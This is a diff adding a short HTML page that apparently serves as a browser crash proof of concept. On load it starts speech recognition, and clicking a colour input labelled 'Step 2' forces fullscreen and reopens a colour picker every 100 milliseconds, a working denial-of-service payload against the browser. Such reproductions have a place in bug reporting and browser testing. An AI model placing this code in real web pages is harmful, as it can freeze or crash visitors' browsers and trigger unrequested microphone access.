@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<head>
+</head>
+<body background="https://www.w3schools.com/tags/w3s.png">
+<script>
+var recognition = new webkitSpeechRecognition();
+recognition.start();
+function Crash(){
+t=document.createElement('input');
+t.type='color';
+document.body.appendChild(t);
+document.documentElement.webkitRequestFullScreen();
+t.click();
+setInterval(function(){t.click();}, 100);
+}
+</script>
+<input type=color value='Step 2' onclick='Crash()'><iframe />
+</body>
